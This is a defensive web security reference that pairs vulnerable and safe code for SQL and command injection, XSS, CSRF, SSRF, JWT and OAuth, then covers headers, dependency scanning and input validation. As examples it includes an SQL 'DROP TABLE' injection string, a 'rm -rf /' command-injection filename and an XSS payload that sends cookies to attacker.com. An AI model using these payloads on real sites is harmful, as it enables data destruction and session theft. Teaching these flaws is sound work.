# Web Security — Complete Reference

> Every web application is a target. Build security in from the start — retrofitting it is ten times harder.

---

## OWASP Top 10 Deep Dive

### 1. Injection (SQL, Command, LDAP, etc.)

#### SQL Injection
```python
# VULNERABLE: string concatenation
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)  # username = "'; DROP TABLE users; --"

# SAFE: parameterized queries
def get_user(username):
    return db.execute("SELECT * FROM users WHERE username = %s", [username])

# SAFE: ORM with parameterization
user = User.query.filter_by(username=username).first()

# SQLAlchemy (always parameterized by default)
user = session.query(User).filter(User.username == username).first()

# Raw SQL with SQLAlchemy (still safe)
result = session.execute(
    text("SELECT * FROM users WHERE username = :username"),
    {"username": username}
)

# If you must build dynamic queries:
from sqlalchemy import select, and_
filters = []
if username: filters.append(User.username == username)
if email: filters.append(User.email == email)
query = select(User).where(and_(*filters))
```

#### Command Injection
```python
# VULNERABLE
import subprocess
filename = request.args.get('file')
os.system(f"cat {filename}")  # filename = "file.txt; rm -rf /"

# VULNERABLE
subprocess.run(f"ping {host}", shell=True)

# SAFE: avoid shell=True, pass args as list
def get_file_info(filename):
    if not re.match(r'^[\w.-]+$', filename):
        raise ValueError("Invalid filename")
    result = subprocess.run(
        ["stat", "--format=%s %y", filename],
        capture_output=True, text=True,
        timeout=5
    )
    return result.stdout

# SAFE: shell=False with list args
subprocess.run(["ping", "-c", "4", host], shell=False)

# Even better: use Python libraries instead of shell commands
import pathlib
stat = pathlib.Path(filename).stat()
```

### 2. Broken Authentication
```python
# VULNERABLE: Weak session management
def login(username, password):
    if check_password(username, password):
        session['user'] = username  # Simple string, easy to forge

# SAFE: Secure session tokens
import secrets
from datetime import datetime, timedelta

def login(username, password):
    if not check_password(username, password):
        # Constant-time response to prevent user enumeration
        time.sleep(0.1)  # Same delay for valid/invalid usernames
        raise AuthError("Invalid credentials")

    session_id = secrets.token_urlsafe(32)
    sessions[session_id] = {
        'user_id': get_user_id(username),
        'created_at': datetime.utcnow(),
        'expires_at': datetime.utcnow() + timedelta(hours=24),
        'ip': request.remote_addr,
        'user_agent': request.user_agent.string
    }

    response = make_response(redirect('/dashboard'))
    response.set_cookie(
        'session',
        session_id,
        httponly=True,    # Not accessible by JavaScript
        secure=True,      # HTTPS only
        samesite='Strict', # CSRF protection
        max_age=86400
    )
    return response

# Password storage
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)

def create_user(email, password):
    password_hash = ph.hash(password)
    return db.create_user(email=email, password_hash=password_hash)

def verify_password(stored_hash, provided_password):
    try:
        ph.verify(stored_hash, provided_password)
        if ph.check_needs_rehash(stored_hash):
            update_password_hash(new_hash=ph.hash(provided_password))
        return True
    except argon2.exceptions.VerifyMismatchError:
        return False
```

### 3. Cross-Site Scripting (XSS)

#### Reflected XSS
```python
# VULNERABLE: Reflecting user input without escaping
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f"<h1>Results for: {query}</h1>"
# URL: /search?q=<script>document.location='http://attacker.com?c='+document.cookie</script>

# SAFE: Always escape HTML output
from markupsafe import Markup, escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    escaped = escape(query)
    return f"<h1>Results for: {escaped}</h1>"

# In Jinja2 templates (auto-escaping)
# {{ variable }}      → auto-escaped
# {{ variable | safe }} → NOT escaped (use only for trusted HTML)
```

#### Stored XSS
```javascript
// VULNERABLE: Inserting user content with innerHTML
const comment = userContent;  // From database, originally user input
document.getElementById('comments').innerHTML += comment;
// If comment contains <script>, it executes

// SAFE: Use textContent (no HTML parsing)
element.textContent = userContent;

// SAFE: DOMPurify for HTML content
import DOMPurify from 'dompurify';
const sanitized = DOMPurify.sanitize(userContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
    ALLOWED_ATTR: []
});
element.innerHTML = sanitized;
```

#### Content Security Policy (CSP)
```python
# Strict CSP header
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'nonce-{nonce}'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self' https://api.example.com; "
        "frame-ancestors 'none'; "
        "base-uri 'self'; "
        "form-action 'self'"
    )
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=()'
    return response
```

### 4. CSRF (Cross-Site Request Forgery)
```python
# VULNERABLE: No CSRF protection
@app.route('/transfer', methods=['POST'])
def transfer():
    amount = request.form['amount']
    to_account = request.form['to']
    process_transfer(session['user'], to_account, amount)
# Attacker can create a form on evil.com that auto-submits to this endpoint

# SAFE: CSRF tokens
import secrets
from functools import wraps

def csrf_protect(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.method in ('POST', 'PUT', 'DELETE', 'PATCH'):
            token = session.get('csrf_token')
            provided = request.form.get('csrf_token') or request.headers.get('X-CSRF-Token')
            if not token or not secrets.compare_digest(token, provided or ''):
                abort(403)
        return f(*args, **kwargs)
    return decorated

# In the view:
@app.before_request
def generate_csrf():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)

# In the template:
# <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">

# Flask-WTF handles this automatically
# For SPAs: SameSite=Strict cookie + custom header (X-Requested-With)
```

### 5. SSRF (Server-Side Request Forgery)
```python
import ipaddress
import socket
from urllib.parse import urlparse

ALLOWED_SCHEMES = {'https', 'http'}
BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),     # Private
    ipaddress.ip_network('172.16.0.0/12'),  # Private
    ipaddress.ip_network('192.168.0.0/16'), # Private
    ipaddress.ip_network('127.0.0.0/8'),    # Loopback
    ipaddress.ip_network('169.254.0.0/16'), # Link-local (AWS metadata)
    ipaddress.ip_network('::1/128'),        # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),       # IPv6 private
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)

    # Check scheme
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False

    # Resolve hostname to IP
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    except (socket.gaierror, ValueError):
        return False

    # Check if IP is in blocked ranges
    for network in BLOCKED_NETWORKS:
        if ip in network:
            return False

    return True

def fetch_url(url: str) -> str:
    if not is_safe_url(url):
        raise ValueError("URL not allowed")
    # Additional: use dedicated egress IP, network-level blocking
    response = requests.get(url, timeout=5, allow_redirects=False)
    return response.text
```

---

## Authentication and Authorization

### JWT Best Practices
```python
import jwt
from datetime import datetime, timedelta

SECRET_KEY = os.environ['JWT_SECRET']  # Min 256 bits, random

def create_tokens(user_id: str) -> dict:
    now = datetime.utcnow()

    access_payload = {
        'sub': user_id,
        'iat': now,
        'exp': now + timedelta(minutes=15),  # Short-lived!
        'type': 'access',
        'jti': secrets.token_hex(16)  # Unique token ID (for revocation)
    }

    refresh_payload = {
        'sub': user_id,
        'iat': now,
        'exp': now + timedelta(days=30),
        'type': 'refresh',
        'jti': secrets.token_hex(16)
    }

    access_token = jwt.encode(access_payload, SECRET_KEY, algorithm='HS256')
    refresh_token = jwt.encode(refresh_payload, SECRET_KEY, algorithm='HS256')
    return {'access': access_token, 'refresh': refresh_token}

def verify_token(token: str, token_type: str) -> dict:
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=['HS256'],  # Explicit algorithm list prevents alg=none attack!
            options={'require': ['exp', 'iat', 'sub', 'type', 'jti']}
        )
    except jwt.ExpiredSignatureError:
        raise AuthError("Token expired")
    except jwt.InvalidTokenError as e:
        raise AuthError(f"Invalid token: {e}")

    if payload['type'] != token_type:
        raise AuthError("Wrong token type")

    # Check revocation list (Redis)
    if redis.sismember('revoked_tokens', payload['jti']):
        raise AuthError("Token revoked")

    return payload

# JWT pitfalls to avoid:
# 1. alg=none: always specify algorithms list
# 2. Weak secrets: use os.urandom(32) not "password"
# 3. Sensitive data in payload: JWT is base64-encoded, NOT encrypted
# 4. No expiry: always set exp
# 5. Long expiry on access tokens: keep short (15 min)
# 6. Missing revocation: use jti + revocation list for logout
```

### OAuth2 + PKCE Flow
```
Authorization Code + PKCE (for SPAs and mobile):

1. Client generates:
   code_verifier = random(32 bytes) → base64url
   code_challenge = base64url(sha256(code_verifier))

2. Client → Authorization Server:
   GET /authorize?
     response_type=code
     client_id=my_app
     redirect_uri=https://app.example.com/callback
     scope=openid profile email
     state=random_value  (CSRF protection)
     code_challenge=...
     code_challenge_method=S256

3. User authenticates → Authorization Server redirects to:
   https://app.example.com/callback?code=AUTH_CODE&state=random_value

4. Client verifies state matches original
5. Client → Authorization Server:
   POST /token
   code=AUTH_CODE
   code_verifier=original_verifier  (server hashes and compares)
   client_id=my_app
   grant_type=authorization_code

6. Server validates code_verifier against stored code_challenge
7. Server returns: access_token, refresh_token, id_token

Benefits:
  - Authorization code not useful without code_verifier
  - State prevents CSRF
  - Works for public clients (no client_secret needed)
```

---

## Security Headers Cheat Sheet

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  → Force HTTPS for 1 year, including subdomains
  → preload: request inclusion in browser HSTS preload list

Content-Security-Policy: (see CSP section above)

X-Content-Type-Options: nosniff
  → Prevent MIME type sniffing

X-Frame-Options: DENY
  → Prevent embedding in iframes (clickjacking protection)
  → Modern: use CSP frame-ancestors instead

Referrer-Policy: strict-origin-when-cross-origin
  → Only send origin (not full URL) on cross-origin requests

Permissions-Policy: geolocation=(), camera=(), microphone=()
  → Opt out of browser features you don't need

Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
  → Isolation policy (required for SharedArrayBuffer, Atomics)

Cross-Origin-Resource-Policy: same-origin
  → Prevent other origins from loading your resources
```

---

## Dependency Security

```bash
# Python
pip install safety
safety check

pip install pip-audit
pip-audit

# Node.js
npm audit
npm audit fix

# Container images
docker scout cves myimage:latest
trivy image myimage:latest

# GitHub: Dependabot
# .github/dependabot.yml:
# version: 2
# updates:
#   - package-ecosystem: pip
#     directory: /
#     schedule: { interval: weekly }
#   - package-ecosystem: docker
#     directory: /
#     schedule: { interval: weekly }
```

---

## Input Validation

```python
from pydantic import BaseModel, Field, validator, EmailStr
from typing import Optional
import re

class UserInput(BaseModel):
    username: str = Field(..., min_length=3, max_length=30, pattern=r'^[a-zA-Z0-9_-]+$')
    email: EmailStr
    age: Optional[int] = Field(None, ge=13, le=120)
    website: Optional[str] = None

    @validator('website')
    def validate_website(cls, v):
        if v is None:
            return v
        if not v.startswith(('http://', 'https://')):
            raise ValueError('Website must start with http:// or https://')
        return v

    @validator('username')
    def no_reserved_words(cls, v):
        reserved = ['admin', 'root', 'system', 'api']
        if v.lower() in reserved:
            raise ValueError(f'{v} is a reserved username')
        return v

# File upload validation
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.webp'}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB

def validate_upload(file):
    # Check extension
    ext = pathlib.Path(file.filename).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"File type {ext} not allowed")

    # Check file size
    file.seek(0, 2)  # Seek to end
    size = file.tell()
    file.seek(0)
    if size > MAX_FILE_SIZE:
        raise ValueError("File too large")

    # Check magic bytes (actual file type, not just extension)
    header = file.read(12)
    file.seek(0)
    if not is_valid_image_header(header):
        raise ValueError("File content doesn't match declared type")
```

---

*Security is not a feature — it's a property. You build it into every decision, every line of code. The attackers only need to find one vulnerability; you need to prevent them all.*
